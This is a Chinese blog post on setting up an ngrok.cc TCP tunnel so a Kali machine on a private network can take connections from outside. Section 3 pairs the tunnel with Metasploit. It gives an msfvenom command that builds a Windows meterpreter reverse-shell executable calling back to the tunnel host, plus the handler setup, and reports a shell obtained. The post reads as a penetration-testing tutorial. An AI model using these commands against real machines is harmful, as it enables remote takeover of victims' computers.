---
title: vps配置ngrok反向代理
mathjax: true
copyright: true
comment: true
date: 2019-9-13 22:34:39
tags: vps
categories: vps
---
作为内网用户我们有时需要本地WEB外网访问、本地开发微信、TCP端口转发，而ngrok能提供web的演示


<!-- more -->

---
### 1 起因:
**自己搭建的ngrok挂掉了**

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVTv8QqMMKzoLaVACw_-LoVU-4q8fTZhMIn0mke_2019-09-11%2008-08-21%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)



### 2 更换ngrok.cc的客户端
#### 2.1 开通一个免费的隧道。

![选择免费的](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVUXCTyxmLvOZFFRb1_-LoVUnBGBgOxzNjbHIW1_QQ%E5%9B%BE%E7%89%8720190911201909.png)

#### 2.2  开通你的隧道

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets.png)

隧道协议选tcp，之后要用metasploit结合ngrok

隧道名称随意

端口选择只要不是服务器端口就好

本地端口选择kali 的内网地址
#### 2.3管理隧道

![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoV%40IG.png)

下载客户端

记录好隧道id

#### 2.4 kali下安装客户端测试

```r
#安装路径下执行
root@kali:~# ./sunny clientid id
#出现online表明成功
```
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVI_LuEGMO4yZbsh8_-LoVVO3UyeLRO-Xnm4YI_Inked2019-09-11%2008-33-47%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_LI.jpg)



现在可以启用web，打开127.0.0.1:4040查看管理。需要设置apache2的端口为端口为kali内的端口，开启apache2的服务

### 3 测试metasploit结合ngrok内网穿透
#### 3.1 生成木马（未免杀）
```r
msfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfen*** LPORT=123** -f exe > /root/Desktop/ngrok.exe
```

#### 3.2 使用Metasploit进行测试
```r
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.200.128(Kali的Linux内网IP)
set lport 1000 (隧道的端口号)
run
```
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fcz_-LoVVTv2GyLgE9_tkQm4_-LoVVoKcjVmGXJ.png)

成功获取shell，不同网段。
### 4 端口选择
**以下为服务端口，不可用选用**
![](https://raw.githubusercontent.com/alpha302/cloudimg/master/assets_-LmZd4hDssHUnSVc-fczE%24I.png)


